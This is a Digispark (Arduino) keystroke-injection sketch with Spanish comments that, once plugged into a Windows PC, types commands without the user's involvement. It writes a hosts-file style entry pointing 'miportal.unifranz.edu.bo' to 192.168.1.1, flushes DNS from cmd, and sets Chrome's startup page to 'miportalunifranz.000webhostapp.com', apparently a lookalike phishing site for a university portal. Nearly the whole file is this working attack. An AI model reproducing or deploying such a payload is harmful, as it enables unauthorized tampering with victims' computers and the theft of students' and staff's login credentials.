
#include <avr/pgmspace.h>
#include "DigiKeyboard.h"    //libreria de teclado
const char line1[] PROGMEM = "bloc de notas";  // texto para el ejecutar
const char line2[] PROGMEM = "192.168.1.1 miportal.unifranz.edu.bo";
const char line3[] PROGMEM = "cmd";
const char line4[] PROGMEM = "ipconfig /flushdns";
const char line5[] PROGMEM = "start chrome";
const char line6[] PROGMEM = "al abrir";
const char line7[] PROGMEM = "miportalunifranz.000webhostapp.com";
char buffer[256];   // tiempo 

//definicion de variables de teclado
#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
#define KEY_UP_ARROW    0x52
#define KEY_DOWN_ARROW  0x51
#define KEY_LEFT_ARROW    0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI      0xE3
#define KEY_ESC       0x29
#define KEY_TAB       0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);   // envio de pulsacion de tecla
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(char *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();

  DigiKeyboard.delay(500);
  
  DigiKeyboard.sendKeyStroke(KEY_Q,MOD_GUI_LEFT);
  //DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT); //Tecla inicio(windows) + R

  DigiKeyboard.delay(1000);

  // bloc de notas
  printText(GetPsz(line1));

  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  
  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);
  
  DigiKeyboard.sendKeyStroke(KEY_A,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_RIGHT_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
 

 //denegacion de la pagina
  DigiKeyboard.delay(1000);
  printText(GetPsz(line2));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_G,MOD_CONTROL_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  //cmd
  printText(GetPsz(line3));
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  printText(GetPsz(line4));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_M,MOD_GUI_LEFT);

  //redireccionamiento

  DigiKeyboard.delay(1500);
  
  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
  

  //cmd
  printText(GetPsz(line3));
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);
  printText(GetPsz(line5));
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);
  DigiKeyboard.sendKeyStroke(KEY_F,MOD_ALT_LEFT);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.sendKeyStroke(KEY_UP_ARROW);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);
  printText(GetPsz(line6));
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  //DigiKeyboard.sendKeyStroke(KEY_TAB);
  //DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_DOWN_ARROW);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);
  printText(GetPsz(line7));
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  DigiKeyboard.delay(1800);
  DigiKeyboard.sendKeyStroke(KEY_F4,MOD_ALT_LEFT);
  
  
  DigiKeyboard.delay(500);


  
  digiEnd();

}
/* Unused endless loop */
void loop() {}
